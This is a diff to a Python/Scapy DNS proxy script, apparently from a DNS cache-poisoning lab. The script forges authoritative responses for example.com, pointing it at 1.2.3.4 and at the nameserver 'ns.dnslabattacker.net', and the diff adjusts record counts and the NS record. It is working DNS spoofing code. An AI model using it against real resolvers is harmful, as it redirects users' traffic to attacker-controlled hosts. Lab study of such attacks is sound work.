@@ -20,7 +20,7 @@ SPOOF = args.spoof_response
 localhost = "127.0.0.1"
 to_be_spoofed = {'example.com.': {
 	'ipv4': '1.2.3.4',
-	'ns': 'ns.dnslabattacker.net'
+	'ns': 'ns.dnslabattacker.net.'
 }}
 
 def send_to_server(dns_ip, query):
@@ -33,7 +33,7 @@ def send_to_server(dns_ip, query):
     return data
 
 def handler(data, addr, socket, dns_ip):
-    print "Received request from client\n", data
+    print "Received request from client"
     server_response = send_to_server(dns_ip, data)
     print "Received response from DNS server"
     if server_response:
@@ -50,9 +50,10 @@ def handler(data, addr, socket, dns_ip):
                 spoofed_dns_packet = IP(dst=original_dns_packet[IP].dst, src=original_dns_packet[IP].src) /\
                     UDP(dport=original_dns_packet[UDP].dport, sport=original_dns_packet[UDP].sport) /\
                     DNS(id=original_dns_packet[DNS].id, qr=1, aa=1, qd=original_dns_packet[DNS].qd,
+                    nscount=1, arcount=0, ancount=1, qdcount=1,
                     an=DNSRR(rrname=original_dns_packet[DNS].qd.qname, ttl=original_dns_packet[DNS].an.ttl,rdata=to_be_spoofed[url]['ipv4']),
-                    ns=DNSRR(rrname=original_dns_packet[DNS].qd.qname, type='NS', ttl=84107, rdata=to_be_spoofed[url]['ns']),
-                    ar=DNSRR(rrname=to_be_spoofed[url]['ns'], type='A', ttl=1360))
+                    ns=DNSRR(rrname=original_dns_packet[DNS].qd.qname, type='NS', ttl=84107, rdata=to_be_spoofed[url]['ns']))
+                    # ar=DNSRR(rrname=to_be_spoofed[url]['ns'], type='A', ttl=1360))
                 print "Spoofed packet", spoofed_dns_packet.show()
                 proxy_response = str(spoofed_dns_packet)
             else:
